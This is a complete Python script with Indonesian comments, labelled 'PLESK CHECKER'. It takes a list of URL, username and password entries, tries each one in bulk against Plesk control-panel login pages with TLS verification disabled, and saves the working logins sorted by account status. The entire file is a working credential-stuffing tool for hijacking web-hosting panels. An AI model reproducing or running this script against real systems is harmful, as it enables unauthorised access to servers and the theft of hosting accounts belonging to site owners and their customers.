import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import os
import ctypes
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Inisialisasi colorama
init(autoreset=True)

# Disable peringatan InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Clear screen and set title
os.system('cls' if os.name == 'nt' else 'clear')
if os.name == 'nt':
    ctypes.windll.kernel32.SetConsoleTitleW('PLESK CHECKER')
else:
    sys.stdout.write('PLESK CHECKER')

# Banner ASCII dengan warna hijau
def print_banner():
    banner = f"""
{Fore.GREEN}
██████╗ ██╗     ███████╗███████╗██╗  ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║     ██╔════╝██╔════╝██║ ██╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     █████╗  ███████╗█████╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔═══╝ ██║     ██╔══╝  ╚════██║██╔═██╗     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║     ███████╗███████╗███████║██║  ██╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
"""
    print(banner)

# Fungsi untuk setup retry
def get_session_with_retries(retries, backoff_factor, status_forcelist):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    return session

# Fungsi pengecekan login Plesk
def check_plesk_login(url, username, password):
    session = get_session_with_retries(retries=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    login_url = url + '/login_up.php'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'login_name': username,
        'passwd': password
    }
    
    try:
        response = session.post(login_url, headers=headers, data=data, timeout=20, verify=False)
        
        # Jika login berhasil
        if response.status_code == 200 and 'logout.php' in response.text:
            # Periksa apakah statusnya 'no subscriptions' atau 'suspended'
            if 'no subscriptions' in response.text.lower():
                print(f"{Fore.GREEN}[VALID]{Style.RESET_ALL} {Fore.YELLOW}[NO SUBSCRIPTIONS]{Style.RESET_ALL} {url}")
                return (url, username, password, "NO SUBSCRIPTIONS")
            elif 'items total' in response.text.lower():
                print(f"{Fore.GREEN}[VALID]{Style.RESET_ALL} {Fore.GREEN}[ACTIVE]{Style.RESET_ALL} {url}")
                return (url, username, password, "ACTIVE")
            elif 'was suspended' in response.text.lower():
                print(f"{Fore.GREEN}[VALID]{Style.RESET_ALL} {Fore.YELLOW}[SUSPENDED]{Style.RESET_ALL} {url}")
                return (url, username, password, "SUSPENDED")
            else:
                print(f"{Fore.GREEN}[VALID]{Style.RESET_ALL} {url}")
                return (url, username, password, "ACTIVE")
        else:
            print(f"{Fore.RED}[FAILED]{Style.RESET_ALL} {url}")
            return "FAILED"
    except requests.exceptions.RequestException:
        print(f"{Fore.YELLOW}[TIMEOUT]{Style.RESET_ALL} {url}")
        return "TIMEOUT"

# Fungsi untuk memeriksa apakah hasil sudah ada di file
def is_duplicate(output_file, entry):
    try:
        with open(output_file, 'r', encoding='utf-8') as output:
            for line in output:
                if entry in line:
                    return True
        return False
    except FileNotFoundError:
        return False  # Jika file tidak ada, anggap tidak ada duplikasi

# Fungsi untuk mengubah judul konsol dengan progress
def set_console_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")

# Fungsi yang akan dijalankan di thread
def process_line(line, output_file, output_file2, total_list, i, result_counts):
    line = line.strip()
    if '|' in line:
        parts = line.split('|')
        if len(parts) == 2 and ':' in parts[1]:  # Format: url|user:password
            url = parts[0]
            credentials = parts[1]
            username, password = credentials.split(':', 1)
        elif len(parts) == 3:  # Format: url|user|password
            url = parts[0]
            username = parts[1]
            password = parts[2]
        else:
            return  # Skip jika format tidak sesuai

        status = check_plesk_login(url, username, password)
        if status and status != "FAILED" and status != "TIMEOUT":
            result_counts["valid"] += 1
            entry = f"{url}|{username}:{password} | {status[3]}"
            entry2 = f"{url}|{username}:{password}"
            # Hanya simpan jika tidak ada duplikasi
            if not is_duplicate(output_file, entry):
                with open(output_file, 'a', encoding='utf-8') as output:
                    output.write(f"{entry}\n")
            if not is_duplicate(output_file2, entry2):
                with open(output_file2, 'a', encoding='utf-8') as output:
                    output.write(f"{entry2}\n")
            if status[3] == "ACTIVE":
                result_counts["active"] += 1
            elif status[3] == "NO SUBSCRIPTIONS":
                result_counts["no_subscriptions"] += 1
            elif status[3] == "SUSPENDED":
                result_counts["suspended"] += 1
        elif status == "FAILED":
            result_counts["failed"] += 1
        elif status == "TIMEOUT":
            result_counts["timeout"] += 1

        # Update judul konsol dengan progress
        set_console_title(f'PLESK CHECKER | PROGRES : {i}/{total_list}')

# Fungsi utama
def main():
    print_banner()
    input_file = input("--> Masukkan file list Plesk: ")
    
    try:
        with open(input_file, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            total_list = len(lines)
            print(f"\n{Fore.GREEN}Total list: {total_list}{Style.RESET_ALL}")
        
        output_file2 = 'valid_plesk_logins.txt'
        output_file = 'valid_plesk_status.txt'

        # Counter hasil akhir
        result_counts = {
            "valid": 0,
            "failed": 0,
            "timeout": 0,
            "active": 0,
            "suspended": 0,
            "no_subscriptions": 0
        }

        # Menggunakan ThreadPoolExecutor dengan 5 thread
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_line, line, output_file, output_file2, total_list, i, result_counts) 
                       for i, line in enumerate(lines, 1)]
            for future in as_completed(futures):
                future.result()  # Menunggu semua thread selesai

        # Tampilkan hasil final
        print(f"\n{Fore.WHITE}[RESULT PLESK] : {Style.RESET_ALL}{Fore.GREEN}Valid: {result_counts['valid']}{Style.RESET_ALL} | {Fore.RED}Failed: {result_counts['failed']}{Style.RESET_ALL} | {Fore.YELLOW}Timeout: {result_counts['timeout']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[RESULT PLESK] : {Style.RESET_ALL}{Fore.GREEN}Active: {result_counts['active']}{Style.RESET_ALL} | {Fore.YELLOW}Suspended: {result_counts['suspended']}{Style.RESET_ALL} | {Fore.CYAN}No Subscriptions: {result_counts['no_subscriptions']}{Style.RESET_ALL}")

    except FileNotFoundError:
        print(f"{Fore.RED}File tidak ditemukan!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
